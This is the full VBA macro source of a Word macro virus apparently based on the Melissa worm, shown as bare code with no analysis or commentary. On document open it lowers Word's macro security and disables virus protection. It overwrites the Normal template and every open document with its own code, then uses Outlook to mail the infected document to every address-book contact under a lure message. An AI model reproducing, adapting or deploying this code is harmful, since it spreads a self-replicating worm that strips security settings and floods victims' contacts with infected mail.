   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Melissa"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   On Error Resume Next
   'Anti-Smyser'
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   Else
   CommandBars("Tools").Controls("Macro").Enabled = False
   Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
   End If
   Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
   NTL = NT.CodeModule.CountOfLines
   If NT.CodeModule.Lines(11, 1) <> "NTL = NT.CodeModule.CountOfLines" Then
       Set Sr = MacroContainer.VBProject.VBComponents.Item(1)
       SrL = Sr.CodeModule.CountOfLines
       If NTL > 0 Then NT.CodeModule.DeleteLines 1, NTL
       NT.CodeModule.InsertLines 1, Sr.CodeModule.Lines(1, SrL)
       NT.Name = "Melissa"
   End If
   If NormalTemplate.Saved = False Then NormalTemplate.Save
   For k = 1 To Application.Documents.Count
       Set kD = Application.Documents.Item(k).VBProject.VBComponents.Item(1)
       kDL = kD.CodeModule.CountOfLines
       If kD.CodeModule.Lines(11, 1) <> "NTL = NT.CodeModule.CountOfLines" Then
           If kDL > 0 Then kD.CodeModule.DeleteLines 1, kDL
           kD.CodeModule.InsertLines 1, NT.CodeModule.Lines(1, NTL)
       End If
       kD.Name = "Melissa"
   Next k
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Cruson") <> "I remembered our old fucking dog last night" Then
   Dim OL, mapi, msg
   Set OL = CreateObject("Outlook.Application")
   Set mapi = OL.GetNameSpace("MAPI")
   If OL = "Outlook" Then
   mapi.Logon "profile", "password"
   Set AB = mapi.AddressLists(0)
   Set msg = OL.CreateItem(0)
   For i = 1 To AB.AddressEntries.Count
       Peep = AB.AddressEntries(i)
       msg.Recipients.Add Peep
   Next i
   msg.Body = "I remembered something last night. It is very, very important document. Look in attachment."
   msg.Subject = "From " & Application.UserName
   msg.Attachments.Add ActiveDocument.FullName
   msg.Send
   Peep = ""
   mapi.Logoff
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Cruson") = "I remembered our old fucking dog last night"
   End If
   End If
   End Sub
   Private Sub Document_Close()
       Document_Open
   End Sub
   Private Sub Document_New()
       Document_Open
   End Sub
